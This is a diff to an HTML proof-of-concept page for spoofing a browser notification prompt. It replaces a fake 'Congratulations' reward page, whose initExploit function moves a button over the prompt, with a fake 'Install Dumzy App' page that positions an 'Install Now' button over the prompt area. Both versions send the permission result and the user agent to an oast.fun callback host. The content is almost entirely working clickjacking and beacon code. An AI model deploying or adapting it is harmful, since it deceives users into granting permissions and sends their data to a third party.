@@ -1,47 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🎁 Exclusive Bonus 🎁</title>
+  <title>Install Dumzy App</title>
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    #claimBtn {
-      background: orange;
-      color: black;
-      padding: 15px 30px;
-      font-size: 20px;
+    body { font-family: sans-serif; text-align: center; padding-top: 100px; }
+    .install-btn {
+      background: green;
+      color: white;
+      padding: 20px 40px;
+      font-size: 22px;
       border: none;
-      border-radius: 5px;
+      border-radius: 10px;
+      position: absolute;
+      top: 190px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
       cursor: pointer;
-      position: relative;
-      z-index: 10000;
     }
   </style>
 </head>
 <body>
-  <h1>🎉 Congratulations! 🎉</h1>
-  <p>You’ve been selected for an exclusive reward.</p>
-  <button id="claimBtn" onclick="initExploit()">CLAIM NOW</button>
+  <h2>📱 Install Dumzy Progressive App</h2>
+  <p>For faster experience, install Dumzy to your home screen.</p>
+
+  <button class="install-btn" onclick="log()">Install Now</button>
 
   <script>
-    async function initExploit() {
-      const btn = document.getElementById('claimBtn');
-
-      // Step 1: Trigger Notification prompt (appears at top by default)
-      Notification.requestPermission().then(result => {
-        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/notif-cloak', {
+    setTimeout(() => {
+      Notification.requestPermission().then(r => {
+        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/pwa-notif-spoof', {
           method: 'POST',
-          body: JSON.stringify({ result, ua: navigator.userAgent }),
-          headers: { 'Content-Type': 'application/json' }
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            result: r,
+            ua: navigator.userAgent
+          })
         });
       });
+    }, 1000);
 
-      // Step 2: Delay a moment and move button over notification area
-      setTimeout(() => {
-        btn.style.position = 'fixed';
-        btn.style.top = '60px';  // roughly where browser shows prompt
-        btn.style.left = '50%';
-        btn.style.transform = 'translateX(-50%)';
-      }, 300); // short delay to align with prompt
+    function log() {
+      // Optional log
     }
   </script>
 </body>
